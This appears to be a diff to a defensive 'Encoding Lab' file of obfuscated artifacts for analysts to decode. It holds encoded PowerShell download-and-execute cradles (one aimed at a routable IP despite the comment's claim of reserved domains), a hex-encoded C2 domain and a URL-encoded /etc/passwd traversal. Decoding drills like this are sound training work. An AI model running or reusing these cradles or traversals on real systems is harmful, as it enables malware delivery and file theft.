@@ -1,8 +1,12 @@
 # Encoding Lab — Artifacts
 # Each line is a real-shaped artifact; decode it without executing.
+# Naming is neutral; C2 domains use RFC 2606 reserved TLDs (.invalid/.example)
+# so they can never resolve. See PROVENANCE.md for what each models.
 
-# --- ARTIFACT 1: Base64-encoded PowerShell command (common in phishing) ---
-# Context: found in Windows Sysmon EventID 1 (process creation), -enc flag
+# --- ARTIFACT 1: Base64-encoded PowerShell command (Emotet-style download cradle) ---
+# Context: found in Windows Sysmon EventID 1 (process creation), -enc flag.
+# This is the classic `powershell.exe -enc <base64>` loader pattern used by
+# commodity malware families (Emotet among them) — see PROVENANCE.md.
 PS_B64=aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvcGF5bG9hZC5wczEnKQ==
 
 # --- ARTIFACT 2: URL-encoded path traversal ---
@@ -11,8 +15,8 @@ URLENC=%2F..%2F..%2F..%2Fetc%2Fpasswd
 
 # --- ARTIFACT 3: Hex-encoded C2 domain (in shellcode stub) ---
 # Context: extracted from a PE, hex dump of the .data section
-HEX=633263726561747075642e6d6572696469616e74657374
+HEX=63646e2d7570646174652e6578616d706c65
 
 # --- ARTIFACT 4: Double-encoded PS (URL-encoded then base64) ---
 # Context: found in IIS log, passed as a query parameter
-DOUBLE=JWlleChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYzIubWVyaWRpYW50ZXN0LmludmFsaWQvcGF5bG9hZCcpJw==
+DOUBLE=aWV4JTIwJTI4TmV3LU9iamVjdCUyME5ldC5XZWJDbGllbnQlMjkuRG93bmxvYWRTdHJpbmclMjglMjdodHRwJTNBJTJGJTJGYzIuY2RuLXVwZGF0ZS5pbnZhbGlkJTJGcGF5bG9hZCUyNyUyOQ==
